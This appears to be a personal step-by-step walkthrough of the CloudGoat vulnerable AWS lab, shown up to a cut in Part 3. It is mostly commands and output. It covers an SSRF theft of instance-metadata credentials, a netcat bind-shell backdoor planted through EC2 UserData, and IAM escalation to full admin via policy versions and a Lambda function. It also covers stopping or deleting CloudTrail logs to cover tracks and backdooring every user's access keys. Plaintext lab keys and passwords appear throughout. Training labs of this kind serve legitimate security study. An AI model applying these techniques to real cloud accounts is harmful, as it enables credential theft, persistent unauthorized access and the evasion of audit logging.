# CloudGoat Setup

# Guides Used
# https://medium.com/@rzepsky/playing-with-cloudgoat-part-1-hacking-aws-ec2-service-for-privilege-escalation-4c42cc83f9da
# https://medium.com/@rzepsky/playing-with-cloudgoat-part-2-fooling-cloudtrail-and-getting-persistence-access-6a1257bb3f7c
# https://medium.com/@rzepsky/playing-with-cloudgoat-part-3-using-aws-lambda-for-privilege-escalation-and-exploring-a-lightsail-4a48688335fa

# Install

  # Install required tools
  brew install gpg terraform

  # Clone Git
  git clone https://github.com/RhinoSecurityLabs/cloudgoat.git && cd cloudgoat

  # Provide test env keys
  aws configure

  # Start env installation
  curl https://wtfismyip.com/text
  ./start 11.11.11.11/32

    # Error
    Error: gpg: using "D5673F3E" as default secret key for signing
    Error: gpg: signing failed: Inappropriate ioctl for device
    Error: gpg: [stdin]: sign+encrypt failed: Inappropriate ioctl for device

    # Solution
    sudo vi ~/.gnupg/gpg.conf
      use-agent
      pinentry-mode loopback

    sudo vi ~/.gnupg/gpg-agent.conf
      allow-loopback-pinentry

  # If something goes bad, run this right after to cleanup
  ./kill.sh

# Credentials setup will be stored here
cat credentials.txt
  # Administrator Password:   emR|LIW))t^6SNt0ga'7
  # Bob's Access Key:         AKIAIXVBVPL6LGKPNBGQ
  # Bob's Secret Key:         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
  # Joe's Access Key:         AKIAJQ7BF2SG2JHX5F7A
  # Joe's Secret Key:         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

# Nimbostratus

  # Nimbostratus is used to fingerprint and explout AWS infrastructures
  # https://andresriancho.github.io/nimbostratus/
  wget https://github.com/andresriancho/nimbostratus/tarball/master
  wget https://github.com/andresriancho/nimbostratus/zipball/master

  tar -xvf andresriancho-nimbostratus-c7c206f.tar.gz
  cd andresriancho-nimbostratus-c7c206f

  pip install -r requirements.txt

  # Dumps the credentials found on a host
  ./nimbostratus dump-credentials

  # Use this command to discover the credentials of compromised keys
  # Bob credentials
  ./nimbostratus dump-permissions --access-key=AKIAIXVBVPL6LGKPNBGQ --secret-key=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
    Current user bob
    {u'Statement': [{u'Action': [u'iam:List*',
                                 u'iam:Get*',
                                 u'ec2:AllocateAddress',
                                 u'ec2:AttachVolume',
                                 u'ec2:CreateDhcpOptions',
                                 u'ec2:CreateFlowLogs',
                                 u'ec2:CreateImage',
                                 u'ec2:CreateRoute',
                                 u'ec2:DescribeInstances',
                                 u'ec2:DescribeInstanceAttribute',
                                 u'ec2:DescribeSecurityGroups',
                                 u'ec2:DescribeSubnets',
                                 u'ec2:DescribeVolumes',
                                 u'ec2:DescribeVpcs',
                                 u'ec2:GetConsoleOutput',
                                 u'ec2:GetConsoleScreenshot',
                                 u'ec2:GetPasswordData',
                                 u'ec2:ModifyInstanceAttribute',
                                 u'ec2:RebootInstances',
                                 u'ec2:StartInstances',
                                 u'ec2:StopInstances'],
                     u'Effect': u'Allow',
                     u'Resource': u'*'}],
     u'Version': u'2012-10-17'}

  # Joe Credentials
  ./nimbostratus dump-permissions --access-key=AKIAJQ7BF2SG2JHX5F7A --secret-key=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
    Current user joe
    {u'Statement': [{u'Action': ['DescribeDBInstances',
                                 'DescribeDBSecurityGroups',
                                 'DescribeDBSnapshots'],
                     u'Effect': u'Allow',
                     u'Resource': u'*'}],
     u'Version': u'2012-10-17'}

# RhinoSecurityLabs GIT repo is full of tools which can be used for AWS Scans

  # Download the repo and navigate to AWS Pentest tools
  git clone https://github.com/RhinoSecurityLabs/Security-Research
  cd Security-Research/tools/aws-pentest-tools

  # Check if its possible to escalate prviledges with exposed credentials
  python3 aws_escalate.py --user-name bob --access-key-id AKIAIXVBVPL6LGKPNBGQ --secret-key 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
    Collecting policies for 1 users...
      bob... done!
      Done.

    User: bob
      No methods possible.

  python3 aws_escalate.py --user-name joe --access-key-id AKIAJQ7BF2SG2JHX5F7A --secret-key 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
    Collecting policies for 1 users...
    List groups for user failed: An error occurred (AccessDenied) when calling the ListGroupsForUser operation: User: arn:aws:iam::194713851162:user/joe is not authorized to perform: iam:ListGroupsForUser on resource: user joe
    List user policies failed: An error occurred (AccessDenied) when calling the ListUserPolicies operation: User: arn:aws:iam::194713851162:user/joe is not authorized to perform: iam:ListUserPolicies on resource: user joe
    List attached user policies failed: An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation: User: arn:aws:iam::194713851162:user/joe is not authorized to perform: iam:ListAttachedUserPolicies on resource: role joe
      joe... done!
      Done.

      User: joe
        No methods possible.

# AWS CLI usage

  # AWS CLI commands can be useful to find the resources attached to those Credentials
  aws ec2 describe-instances --profile bob
  aws ec2 describe-instances --profile joe

  # Discovered ec2 instances
  SG: cloudgoat_ec2_sg
  SGID: sg-02d11f0ebcdac2026
  ID: i-0e64d944e146479e8
  DNS: ec2-34-211-130-199.us-west-2.compute.amazonaws.com

  # UserData is often used to run updates when instances Start
  # The contents are Base64 encoded, simply do a reverse online
  aws ec2 describe-instance-attribute --instance-id i-0e64d944e146479e8 --attribute userData --profile bob
  # Byte64 Encoded UserData
    {
        "InstanceId": "i-0e64d944e146479e8",
        "UserData": {
            "Value": "IyEvYmluL2Jhc2gKeXVtIHVwZGF0ZSAteQp5dW0gaW5zdGFsbCBwaHAgLXkKeXVtIGluc3RhbGwgaHR0cGQgLXkKbWtkaXIgLXAgL3Zhci93d3cvaHRtbApjZCAvdmFyL3d3dy9odG1sCnJtIC1yZiAuLyoKcHJpbnRmICI8P3BocFxuaWYoaXNzZXQoXCRfUE9TVFsndXJsJ10pKSB7XG4gIGlmKHN0cmNtcChcJF9QT1NUWydwYXNzd29yZCddLCAnMTg5NjM0Njg4MjQyNDMxMzk2NzIzNjk5MTMyMzMnKSAhPSAwKSB7XG4gICAgZWNobyAnV3JvbmcgcGFzc3dvcmQuIFlvdSBqdXN0IG5lZWQgdG8gZmluZCBpdCEnO1xuICAgIGRpZTtcbiAgfVxuICBlY2hvICc8cHJlPic7XG4gIGVjaG8oZmlsZV9nZXRfY29udGVudHMoXCRfUE9TVFsndXJsJ10pKTtcbiAgZWNobyAnPC9wcmU+JztcbiAgZGllO1xufVxuPz5cbjxodG1sPjxoZWFkPjx0aXRsZT5VUkwgRmV0Y2hlcjwvdGl0bGU+PC9oZWFkPjxib2R5Pjxmb3JtIG1ldGhvZD0nUE9TVCc+PGxhYmVsIGZvcj0ndXJsJz5FbnRlciB0aGUgcGFzc3dvcmQgYW5kIGEgVVJMIHRoYXQgeW91IHdhbnQgdG8gbWFrZSBhIHJlcXVlc3QgdG8gKGV4OiBodHRwczovL2dvb2dsZS5jb20vKTwvbGFiZWw+PGJyIC8+PGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3Bhc3N3b3JkJyBwbGFjZWhvbGRlcj0nUGFzc3dvcmQnIC8+PGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3VybCcgcGxhY2Vob2xkZXI9J1VSTCcgLz48YnIgLz48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nUmV0cmlldmUgQ29udGVudHMnIC8+PC9mb3JtPjwvYm9keT48L2h0bWw+IiA+IGluZGV4LnBocAovdXNyL3NiaW4vYXBhY2hlY3RsIHN0YXJ0"
        }
    }

    # https://www.base64decode.org/
    #!/bin/bash
    yum update -y
    yum install php -y
    yum install httpd -y
    mkdir -p /var/www/html
    cd /var/www/html
    rm -rf ./*
    printf "<?php\nif(isset(\$_POST['url'])) {\n  if(strcmp(\$_POST['password'], '18963468824243139672369913233') != 0) {\n    echo 'Wrong password. You just need to find it!';\n    die;\n  }\n  echo '<pre>';\n  echo(file_get_contents(\$_POST['url']));\n  echo '</pre>';\n  die;\n}\n?>\n<html><head><title>URL Fetcher</title></head><body><form method='POST'><label for='url'>Enter the password and a URL that you want to make a request to (ex: https://google.com/)</label><br /><input type='text' name='password' placeholder='Password' /><input type='text' name='url' placeholder='URL' /><br /><input type='submit' value='Retrieve Contents' /></form></body></html>" > index.php
    /usr/sbin/apachectl start

  # Open up the EC2 Security group
  # List current security groups and find one with open permissions
  aws ec2 describe-security-groups --profile bob
    "Description": "Debug SG for EC2 instances",
    "IpPermissions": [
        {
            "PrefixListIds": [],
            "FromPort": 0,
            "IpRanges": [
                {
                    "CidrIp": "86.188.215.47/32"
                }
            ],
            "ToPort": 65535,
            "IpProtocol": "tcp",
            "UserIdGroupPairs": [],
            "Ipv6Ranges": []
        }
    ],
    "GroupName": "cloudgoat_ec2_debug_sg",
    "VpcId": "vpc-93f12deb",
    "OwnerId": "194713851162",
    "GroupId": "sg-03b042674afe93169"
    }

  # Attach opened security group to the instance
  aws ec2 modify-instance-attribute --instance-id i-0e64d944e146479e8 --groups sg-0398bc116f32f459c --profile bob
    # Connection is now allowed however service listening on port 80 is not accepting requests.
    # curl ec2-34-211-130-199.us-west-2.compute.amazonaws.com
      # <html><head><title>URL Fetcher</title></head><body><form method='POST'><label for='url'>Enter the password and a URL that you want to make a request to (ex: https://google.com/)</label><br /><input type='text' name='password' placeholder='Password' /><input type='text' name='url' placeholder='URL' /><br /><input type='submit' value='Retrieve Contents' /></form></body></html>

# Capture request to extract instance meta data
# Open OWASP Zap
# Launch browser of choice
# Navigate to http://ec2-34-211-130-199.us-west-2.compute.amazonaws.com/
# Left hand pane - right click the same address and add to default context, confirm
# In the search bar below, click the target icon to filter context, and look navigate to link
# Once reached, provide the password obtained from UserData and inject Google Address as suggested
# Let the request go through, in Zap Look for the POST request, right-click and edit and resend with Editor

# Modify the request and resend
  # From:
  password=18963468824243139672369913233&url=https%3A%2F%2Fgoogle.com%2F
  # To:
  password=18963468824243139672369913233&url=http%3A%2F%2F169.254.169.254/latest/meta-data/iam/security-credentials/ec2_role/

# Click send in top right corner, and observe the response
# This request will trigger an alert in GuardDuty, as its carried out from outside the instance
# The credentials listed below are of the instance profile ec2_role
  <pre>{
    "Code" : "Success",
    "LastUpdated" : "2019-03-20T12:34:38Z",
    "Type" : "AWS-HMAC",
    "AccessKeyId" : "ASIAS2VOZSUNP3Q5Z7OJ",
    "SecretAccessKey" : "jAqlBvkWow5NxNqHaR3NF7RCY0rfIW1nB78gJTxK",
    "Token" : "FQoGZXIvYXdzEMb//////////wEaDJ2UKdLAeoY2VO3ZwiK3A7jBGVUKruFMdBiOiplCTzT3qEKPBr0CSx0nk3poRYorYyndQZ5SB3R60WhbKJos3XZNNkqTLOjWvCFx58t/Wlc3O1RM5+CPHKgqEQmGSImMhDqIGoLUJ+9SOoQDUpg3aETMdKSFAFxPxIWHjN165xk/JIhVFauFT++ILPJnuqSAsd484trQ1xp/a721N2EBUsAYDmXJhLR6M6TmveOzsGEz7Hdn+t1MYQuF5lAAEoAjPbdJP8fTrQJiNeq4ArDI5fSLDXmagZTnG+uWlMcg0JgXig7obFZvj/m7ffrHWTJZATPF1F1TdlZtFy1a5m/19eZfxihMfdpVMIUopGjsR6FKHlRfg4kR1KJfXJgNJJOPFtzzdzWIHBwr7fx+0g7DQa3G+f9qTUtXl0iti1jeFW7tUmnAq9DGhtOdSA4p1EK9MpPeYVQUUp9V9734NhqY9dUrGaTWXh2GzKikX7E5mfUl3qCBoty5C4x32Ys4n6Z7+diYleajTcSLr1RgBIpo2vauHgWR+xLt9MPvukjK9A4watGOyaUwxA5kJplpGC4EmWo8vIf1xw239+hS1IZNVW6Rlput29Qo7ubI5AU=",
    "Expiration" : "2019-03-20T19:09:36Z"
  }</pre>

# To avoid GuardDuty triggering use PHP empty array exploit
# Modify the request and resend
  # From:
    # password=18963468824243139672369913233&url=http%3A%2F%2F169.254.169.254/latest/meta-data/iam/security-credentials/ec2_role/
  # To:
    # password[]=&url=http%3A%2F%2F169.254.169.254/latest/meta-data/iam/security-credentials/ec2_role/

# Sending this request will bypass the GuardDuty alert
  <pre>{
    "Code" : "Success",
    "LastUpdated" : "2019-03-20T12:34:38Z",
    "Type" : "AWS-HMAC",
    "AccessKeyId" : "ASIAS2VOZSUNP3Q5Z7OJ",
    "SecretAccessKey" : "jAqlBvkWow5NxNqHaR3NF7RCY0rfIW1nB78gJTxK",
    "Token" : "FQoGZXIvYXdzEMb//////////wEaDJ2UKdLAeoY2VO3ZwiK3A7jBGVUKruFMdBiOiplCTzT3qEKPBr0CSx0nk3poRYorYyndQZ5SB3R60WhbKJos3XZNNkqTLOjWvCFx58t/Wlc3O1RM5+CPHKgqEQmGSImMhDqIGoLUJ+9SOoQDUpg3aETMdKSFAFxPxIWHjN165xk/JIhVFauFT++ILPJnuqSAsd484trQ1xp/a721N2EBUsAYDmXJhLR6M6TmveOzsGEz7Hdn+t1MYQuF5lAAEoAjPbdJP8fTrQJiNeq4ArDI5fSLDXmagZTnG+uWlMcg0JgXig7obFZvj/m7ffrHWTJZATPF1F1TdlZtFy1a5m/19eZfxihMfdpVMIUopGjsR6FKHlRfg4kR1KJfXJgNJJOPFtzzdzWIHBwr7fx+0g7DQa3G+f9qTUtXl0iti1jeFW7tUmnAq9DGhtOdSA4p1EK9MpPeYVQUUp9V9734NhqY9dUrGaTWXh2GzKikX7E5mfUl3qCBoty5C4x32Ys4n6Z7+diYleajTcSLr1RgBIpo2vauHgWR+xLt9MPvukjK9A4watGOyaUwxA5kJplpGC4EmWo8vIf1xw239+hS1IZNVW6Rlput29Qo7ubI5AU=",
    "Expiration" : "2019-03-20T19:09:36Z"
  }</pre>

# Breach EC2 Instance loudly by editing the UserData executed on launch
  # Stop instance
  aws ec2 stop-instances --instance-id i-0e64d944e146479e8 --profile bob
    # Response is as follows
    {
        "StoppingInstances": [
            {
                "InstanceId": "i-0e64d944e146479e8",
                "CurrentState": {
                    "Code": 64,
                    "Name": "stopping"
                },
                "PreviousState": {
                    "Code": 16,
                    "Name": "running"
                }
            }
        ]
    }

  # Install NetCat locally
  brew install netcat
  apt-get install nmap

  # Create new UserData to send to instance, save this to a file
  # https://aws.amazon.com/premiumsupport/knowledge-center/execute-user-data-ec2/
  Content-Type: multipart/mixed; boundary="//"
  MIME-Version: 1.0

  --//
  Content-Type: text/cloud-config; charset="us-ascii"
  MIME-Version: 1.0
  Content-Transfer-Encoding: 7bit
  Content-Disposition: attachment; filename="cloud-config.txt"

  #cloud-config
  cloud_final_modules:
  - [scripts-user, always]

  --//
  Content-Type: text/x-shellscript; charset="us-ascii"
  MIME-Version: 1.0
  Content-Transfer-Encoding: 7bit
  Content-Disposition: attachment; filename="userdata.txt"

  #!/bin/bash
  rm -rf /var/lib/cloud/*
  yum update -y
  yum install php -y
  yum install httpd -y
  mkdir -p /var/www/html
  cd /var/www/html
  rm -rf ./*
  printf "<?php\nif(isset(\$_POST['url'])) {\n  if(strcmp(\$_POST['password'], '18963468824243139672369913233') != 0) {\n    echo 'Wrong password. You just need to find it!';\n    die;\n  }\n  echo '<pre>';\n  echo(file_get_contents(\$_POST['url']));\n  echo '</pre>';\n  die;\n}\n?>\n<html><head><title>URL Fetcher</title></head><body><form method='POST'><label for='url'>Enter the password and a URL that you want to make a request to (ex: https://google.com/)</label><br /><input type='text' name='password' placeholder='Password' /><input type='text' name='url' placeholder='URL' /><br /><input type='submit' value='Retrieve Contents' /></form></body></html>" > index.php
  /usr/sbin/apachectl start
  yum install -y nmap
  sudo nc -nvlp 1337 -k -e /bin/bash &
  --//

  # Encode UserData with Base64
  base64 myuserdata.sh > myuserdata_base64.sh

  # Replace the UserData with the modified file in Base64
  aws ec2 modify-instance-attribute --instance-id i-0e64d944e146479e8 --attribute userData --value file://myuserdata_base64.sh --profile bob

  # Start the instance to apply the changes
  aws ec2 start-instances --instance-id i-0e64d944e146479e8 --profile bob
    {
        "StartingInstances": [
            {
                "InstanceId": "i-0e64d944e146479e8",
                "CurrentState": {
                    "Code": 0,
                    "Name": "pending"
                },
                "PreviousState": {
                    "Code": 80,
                    "Name": "stopped"
                }
            }
        ]
    }

  # Get new instance IP
  aws ec2 describe-instances --profile bob
    # "PublicDnsName": "ec2-34-212-77-149.us-west-2.compute.amazonaws.com"

  # Connect to the instance through netcat
  # Now you can use the ec2_role without triggering GuardDuty, as you are on the instance
  nc -nv 34.212.77.149 1337

# Verify your permissions on the instance

  # What policy is used by ec2_role (your current permissions)
  aws iam list-attached-role-policies --role-name ec2_role --profile bob
    {
        "AttachedPolicies": [
            {
                "PolicyName": "ec2_ip_policy",
                "PolicyArn": "arn:aws:iam::194713851162:policy/ec2_ip_policy"
            }
        ]
    }

  # Current version of ec2_ip_policy
  aws iam get-policy --policy-arn arn:aws:iam::194713851162:policy/ec2_ip_policy --profile bob
    {
        "Policy": {
            "PolicyName": "ec2_ip_policy",
            "PermissionsBoundaryUsageCount": 0,
            "CreateDate": "2019-03-20T12:32:31Z",
            "AttachmentCount": 1,
            "IsAttachable": true,
            "PolicyId": "ANPAI3IRRA7JZKNBBOPDS",
            "DefaultVersionId": "v1",
            "Path": "/",
            "Arn": "arn:aws:iam::194713851162:policy/ec2_ip_policy",
            "UpdateDate": "2019-03-20T12:32:31Z"
        }
    }

  # Check the permissions of the ec2_role
  aws iam get-policy-version --policy-arn arn:aws:iam::194713851162:policy/ec2_ip_policy --version-id v1 --profile bob
    # The current policy attached allows us to make new policies which means we can make custom ones and escalate priviledges
    {
        "PolicyVersion": {
            "CreateDate": "2019-03-20T12:32:31Z",
            "VersionId": "v1",
            "Document": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Action": [
                            "iam:CreatePolicyVersion"
                        ],
                        "Resource": "*",
                        "Effect": "Allow"
                    }
                ]
            },
            "IsDefaultVersion": true
        }
    }

  # As the netcat commands are limited, simply echo out the new policy to files
  echo '{
      "Version": "2012-10-17",
      "Statement": [
          {
              "Effect": "Allow",
              "Action": "*",
              "Resource": "*"
          }
      ]
  }' >> escalated_policy.json

  # Upload the new file and set as default Policy - on the host node
  aws iam create-policy-version --policy-arn arn:aws:iam::194713851162:policy/ec2_ip_policy --policy-document file:///var/www/html/escalated_policy.json --set-as-default
    {
        "PolicyVersion": {
            "CreateDate": "2019-03-20T16:12:51Z",
            "VersionId": "v2",
            "IsDefaultVersion": true
        }
    }

  # Verify the new policy has been applied
  aws iam get-policy-version --policy-arn arn:aws:iam::194713851162:policy/ec2_ip_policy --version-id v2
    {
        "PolicyVersion": {
            "CreateDate": "2019-03-20T16:12:51Z",
            "VersionId": "v2",
            "Document": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Action": "*",
                        "Resource": "*",
                        "Effect": "Allow"
                    }
                ]
            },
            "IsDefaultVersion": true
        }
    }

# ==================== PART 1 COMPLETE ==================== # # ==================== PART 1 COMPLETE ==================== #

# ===================== PART 2 START ====================== # # ===================== PART 2 START ====================== #

# Setup the CloudGoat environment again or continue from previous

# Escalating permissions via role exploitation

  # Get the new Credentials
  cat credentials.txt
    # Administrator Password:   qeYOY+[AqLGytH)xVB9V
    # Bob's Access Key:         AKIAJHDPSMQWPEWNIVQQ
    # Bob's Secret Key:         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
    # Joe's Access Key:         AKIAIEMWHZVVA3XQZ5SA
    # Joe's Secret Key:         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

  # Run the previous steps if started fresh, to obtain the new permissions - ran locally
  aws cloudtrail describe-trails --profile joe
  aws ec2 describe-instances --profile bob
  aws ec2 describe-instance-attribute --instance-id i-0c6716fd9be13257a --attribute userData --profile bob
  aws ec2 describe-security-groups --profile bob
  aws ec2 modify-instance-attribute --instance-id i-0c6716fd9be13257a --groups sg-05e59dc6877a260d7 --profile bob
  aws ec2 stop-instances --instance-id i-0c6716fd9be13257a --profile bob
  vi userdata.sh
  base64 userdata.txt > userdata_base.sh
  aws ec2 modify-instance-attribute --instance-id i-0c6716fd9be13257a --attribute userData --value file://userdata_base.sh --profile bob
  aws ec2 start-instances --instance-id i-0c6716fd9be13257a --profile bob
  aws ec2 describe-instances --profile bob
  aws iam list-attached-role-policies --role-name ec2_role --profile bob
  aws iam get-policy --policy-arn arn:aws:iam::194713851162:policy/ec2_ip_policy --profile bob
  aws iam get-policy-version --policy-arn arn:aws:iam::194713851162:policy/ec2_ip_policy --version-id v1 --profile bob

    # Connect to the new instance via netcat
    nc -nv 35.162.175.94 1337
      # Create the new policy file - ran on host
      echo '{
          "Version": "2012-10-17",
          "Statement": [
              {
                  "Effect": "Allow",
                  "Action": "*",
                  "Resource": "*"
              }
          ]
      }' >> escalated_policy.json

      # Create a new policy version and set as default
      aws iam create-policy-version --policy-arn arn:aws:iam::194713851162:policy/ec2_ip_policy --policy-document file:///var/www/html/escalated_policy.json --set-as-default
      # Verify new policy
      aws iam get-policy-version --policy-arn arn:aws:iam::194713851162:policy/ec2_ip_policy --version-id v2

  # With the administrator permissions restored we can analyse current CloudTrail config
  # Provide the user Bob with the new policy by attaching it from the host instance
  aws iam attach-user-policy --user-name bob --policy-arn "arn:aws:iam::194713851162:policy/ec2_ip_policy"

    # Bob should be able to request CloudTrail from the local machine
    aws cloudtrail describe-trails --profile bob
      {
          "trailList": [
              {
                  "IncludeGlobalServiceEvents": true,
                  "IsOrganizationTrail": false,
                  "Name": "cloudgoat_trail",
                  "S3KeyPrefix": "cloudtrail",
                  "TrailARN": "arn:aws:cloudtrail:us-west-2:194713851162:trail/cloudgoat_trail",
                  "LogFileValidationEnabled": true,
                  "IsMultiRegionTrail": false,
                  "HasCustomEventSelectors": false,
                  "S3BucketName": "3212625357156459597172710311740308222952246992733311263",
                  "HomeRegion": "us-west-2"
              }
          ]
      }

  # CloudTrail analysis
    # All the CloudTrail logs are stored in the S3 bucket listed above
    # The CloudTrail config is disabled for cross-region, which means we can do anything elsewhere and it wont be logged
    "S3BucketName": "3212625357156459597172710311740308222952246992733311263"

    # We can stop CloudTrail logging entirely
    aws cloudtrail stop-logging --name cloudgoat_trail --profile bob

    # Confirm the new changes, that logging has been disabled
    # Any malicious activity now will not belogged
    aws cloudtrail get-trail-status --name cloudgoat_trail --profile bob
      {
          "LatestNotificationAttemptSucceeded": "",
          "LatestDeliveryAttemptTime": "2019-03-21T10:30:55Z",
          "LatestDeliveryTime": 1553164255.61,
          "LatestDeliveryAttemptSucceeded": "2019-03-21T10:30:55Z",
          "IsLogging": false,
          "TimeLoggingStarted": "2019-03-21T09:47:56Z",
          "StartLoggingTime": 1553161676.02,
          "LatestDigestDeliveryTime": 1553164284.477,
          "StopLoggingTime": 1553164363.155,
          "LatestNotificationAttemptTime": "",
          "TimeLoggingStopped": "2019-03-21T10:32:43Z"
      }

    # Very loud methods of stopping logs which will be picked up by GuardDuty

      # After your nefarious activities have been carried out, re-enable CloudTrail to cover tracks
      aws cloudtrail start-logging --name cloudgoat_trail --profile bob

      # You can also permanently stop CloudTrail by removing the trails themselves
      aws cloudtrail delete-trail --name cloudgoat_trail --profile bob

      # Alternatively the S3 bucket which stores the logs can be removed, make sure to use the --force flag
      aws s3 rb s3://3212625357156459597172710311740308222952246992733311263 --force --profile bob

    # Quieter methods of avoiding CloudTrail logging

      # Disable global service events - IAM modifications will not be logged, even when new users are created
      aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event --profile bob

      # Change the logging to a new bucket and reverse the setting after actions are done
      aws cloudtrail update-trail --name cloudgoat_trail --s3-bucket-name <yournewbucketname> --profile bob

        # When you want to cover your tracks, rever the setting and remove your bucket
        aws cloudtrail update-trail --name cloudgoat_trail --s3-bucket-name 3212625357156459597172710311740308222952246992733311263 --profile bob
        aws s3 rb s3://<yournewbucketname> --force --profile bob

        # Please note that all above-mentioned actions will hide your activity from CloudTrail logs kept in S3 bucket,
        # but all actions are also recorded by CloudTrail Event History and stored there for 90 days.
        # Fortunately it is enabled by default in all regions and cannot be turned off.

  # Persistance of access

    # Add a backdoor with userData
      # Add netcat backdoor
      # Upload SSH key via userData
      aws ec2 modify-instance-attribute --instance-id i-0e64d944e146479e8 --attribute userData --value file://myuserdata_base64.sh --profile bob

    # Use GitTools
      # https://github.com/dagrz/aws_pwn
      # Persistance section has a tool called backdoor_all_user.py
      # Execute this code to create additional access keys per user
        python backdoor_all_users.py
          administrator
            AKIAIFF3442TRQKXDTXA
            dzWkqmtzajBAkk0d7ASPnn+E6Cq1EEooMGMcNejd
          bob
            AKIAIPZHCHQVDD2I6UGA
            upv5eyKIgaXMPWdqhd8fVHCYFSvLsWRsAIMHfj7U
          joe
            AKIAIDVM2BXCASK2O3EA
            +pAoLd5+SMLYLjvrj907lsBQJCwTQuFFEWsKIAFi
      # This function will not trigger the user of new access keys
      # If CloudTrail of global services is disabled, these events wont be logged
      # GuardDuty wont recognise these activities as suspicious either.

  # Protections and Conclusions:
    # Sure! Here, I gathered a list of countermeasures to take:
      # Enable CloudTrail Log integrity in case the attacker would like to replace an S3 object containing his fingerprints.
      # Remove CloudTrail permissions (as well as those which may allow for privilege escalation; you‘ll find all those dangerous permissions here) from all users, except those who really needs them (to follow the principle of least privilege you may find helpful a tool from Netflix: Repokid).
      # Set up CloudTrail’s S3 bucket Cross Region Replication to bucket owned by other AWS account. The logs sent to the bucket owned by the second account won’t be reachable for anyone under the primary account.
      # Enable MFA Delete for removing objects from CloudTrail’s bucket.
      # Backup your logs outside the AWS, e.g. to Splunk.
      # Start monitoring dangerous events using AWS CloudWatch Events or the external services like Cloudsploit Events or CloudTrail Listener.

# ==================== PART 2 COMPLETE ==================== # # ==================== PART 2 COMPLETE ==================== #

# ===================== PART 3 START ====================== # # ===================== PART 3 START ====================== #

# Setup the CloudGoat environment again or continue from previous

# Using Lambda for priviledge escalation

  # Verify current permissions
    aws iam list-attached-user-policies --user-name joe --profile bob
      # User joe is managed by a policy called DatabaseAdministrator
      {
          "AttachedPolicies": [
              {
                  "PolicyName": "DatabaseAdministrator",
                  "PolicyArn": "arn:aws:iam::aws:policy/job-function/DatabaseAdministrator"
              }
          ]
      }

  # Discover which roles can be attached to a Lambda function
    aws iam list-roles --profile joe

  # Choose the appropriate role, and identify its policies (often named with Lambda prefix)
    aws iam list-role-policies --role-name lambda-dynamodb-cloudgoat --profile bob
      {
          "PolicyNames": [
              "policy_for_lambda_dynamo_role"
          ]
      }

    # Once the policy is identified, retrieve its permissions
      aws iam get-role-policy --role-name lambda-dynamodb-cloudgoat --policy-name policy_for_lambda_dynamo_role --profile bob
      # Observe that this policy has the "AttachRolePolicy" permissions, which allows us to assign whatever we like
      # This escalation via Lambda will provide us administrator access
        {
            "RoleName": "lambda-dynamodb-cloudgoat",
            "PolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Action": [
                            "iam:DeleteRolePolicy",
                            "logs:*",
                            "iam:ListRoles",
                            "dynamodb:*",
                            "iam:AttachRolePolicy"
                        ],
                        "Resource": "*",
                        "Effect": "Allow"
                    }
                ]
            },
            "PolicyName": "policy_for_lambda_dynamo_role"
        }

    # Create a small Lambda function with python and zip it for upload
      vi escalate_joe.py

        import boto3

        def lambda_handler(event, context):
            iam = boto3.client("iam")
            iam.attach_role_policy(RoleName="lambda-dynamodb-cloudgoat",
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",)
            iam.attach_user_policy(UserName="joe",
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",)

      # Zip the file
        zip escalate_joe escalate_joe.py

      # Upload the script to Lambda
      # The ZIP filename and the function name must be the same
      aws lambda create-function --function-name escalate_joe --runtime python3.6 --role arn:aws:iam::194713851162:role/lambda-dynamodb-cloudgoat --handler escalate_joe.lambda_handler --zip-file fileb://escalate_joe.zip --profile joe
        {
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "CodeSha256": "NFk+f3rvTo/IxMSsmOaCJXy7MrNpsn9ZRlUxxCx4gyw=",
            "FunctionName": "escalate_joe",
            "CodeSize": 355,
            "RevisionId": "cdfe98b4-4d69-40d0-a0cd-eb318a4f39a9",
            "MemorySize": 128,
            "FunctionArn": "arn:aws:lambda:us-west-2:194713851162:function:escalate_joe",
            "Version": "$LATEST",
            "Role": "arn:aws:iam::194713851162:role/lambda-dynamodb-cloudgoat",
            "Timeout": 3,
            "LastModified": "2019-03-21T12:12:47.907+0000",
            "Handler": "escalate_joe.lambda_handler",
            "Runtime": "python3.6",
            "Description": ""
        }

      # We now have to invoke the Lambda to escalate priviledges,
      # however this user does not have invoke permissions.
      # Joe is linked to DynamoDB which means we can trigger lambda, when a new record is made

      # Create a new record in DynamoDB
        # This command creates a table with 1 column to store strings - use this to test your permissions
      aws dynamodb create-table --table-name joe_table --attribute-definitions AttributeName=Test,AttributeType=S --key-schema AttributeName=Test,KeyType=HASH --provisioned-throughput ReadCapacityUnits=3,WriteCapacityUnits=3 --stream-specification StreamEnabled=true,StreamViewType=NEW_IMAGE --query TableDescription.LatestStreamArn --profile joe
        # Response
        "arn:aws:dynamodb:us-west-2:194713851162:table/joe_table/stream/2019-03-21T11:55:43.291"

      # Now create a DynamoDB table with streams enabled
      aws dynamodb create-table --table-name escalate_priv --attribute-definitions AttributeName=Test,AttributeType=S --key-schema AttributeName=Test,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES --profile joe
        # Response
        {
            "TableDescription": {
                "TableArn": "arn:aws:dynamodb:us-west-2:194713851162:table/escalate_priv",
                "AttributeDefinitions": [
                    {
                        "AttributeName": "Test",
                        "AttributeType": "S"
                    }
                ],
                "ProvisionedThroughput": {
                    "NumberOfDecreasesToday": 0,
                    "WriteCapacityUnits": 5,
                    "ReadCapacityUnits": 5
                },
                "TableSizeBytes": 0,
                "TableName": "escalate_priv",
                "TableStatus": "CREATING",
                "StreamSpecification": {
                    "StreamViewType": "NEW_AND_OLD_IMAGES",
                    "StreamEnabled": true
                },
                "TableId": "931be20e-03f3-48a5-a670-21151fb4ea77",
                "LatestStreamLabel": "2019-03-21T12:13:25.763",
                "KeySchema": [
                    {
                        "KeyType": "HASH",
                        "AttributeName": "Test"
                    }
                ],
                "ItemCount": 0,
                "CreationDateTime": 1553170405.763,
